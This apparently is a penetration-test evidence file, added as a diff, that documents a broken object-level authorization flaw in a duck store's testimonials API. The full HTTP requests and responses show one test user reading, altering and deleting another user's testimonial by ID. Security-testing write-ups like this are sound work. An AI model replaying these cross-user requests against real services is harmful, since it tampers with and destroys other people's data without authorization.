@@ -1,0 +1,50 @@
+=== IDOR/BOLA Reproduction Evidence ===
+
+Target: https://duck-store.escape.tech/api/v1/testimonials/{id}
+
+Users:
+- user_a: testuserA (id: d8083077-d088-4bfe-b147-0ad561de59c2)
+- user_b: testuserB (id: 525a9d6a-3532-4df6-b164-340aa300be97)
+
+Step 1: user_a creates testimonial
+POST /api/v1/testimonials/
+Authorization: Bearer <user_a_token>
+Body: {"rating": 5, "content": "Test testimonial from user_a"}
+
+Response: 200 OK
+{"id":7,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Test testimonial from user_a","rating":5,"is_featured":false,"created_at":"2026-09-29T10:09:22.428828","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+Step 2: user_b READS user_a's testimonial (ID 7) - CROSS-USER READ
+GET /api/v1/testimonials/7
+Authorization: Bearer <user_b_token>
+
+Response: 200 OK
+{"id":7,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Test testimonial from user_a","rating":5,"is_featured":false,"created_at":"2026-09-29T10:09:22.428828","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+Step 3: user_b MODIFIES user_a's testimonial (ID 7) - CROSS-USER MODIFY
+PUT /api/v1/testimonials/7
+Authorization: Bearer <user_b_token>
+Body: {"rating": 1, "content": "Modified by user_b - IDOR test"}
+
+Response: 200 OK
+{"id":7,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Modified by user_b - IDOR test","rating":1,"is_featured":false,"created_at":"2026-09-29T10:09:22.428828","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+Step 4: user_b DELETES user_a's testimonial (ID 7) - CROSS-USER DELETE
+DELETE /api/v1/testimonials/7
+Authorization: Bearer <user_b_token>
+
+Response: 204 No Content
+HTTP/2 204
+content-type: application/json
+
+Step 5: Verify deletion - user_a can no longer access testimonial
+GET /api/v1/testimonials/7
+Authorization: Bearer <user_a_token>
+
+Response: 404 Not Found
+{"detail":"Testimonial not found"}
+
+=== CONCLUSION ===
+The /api/v1/testimonials/{id} endpoint has Broken Object Level Authorization (BOLA/IDOR).
+Any authenticated user can READ, MODIFY, and DELETE any other user's testimonials
+by simply changing the testimonial ID in the URL. No authorization checks are performed.
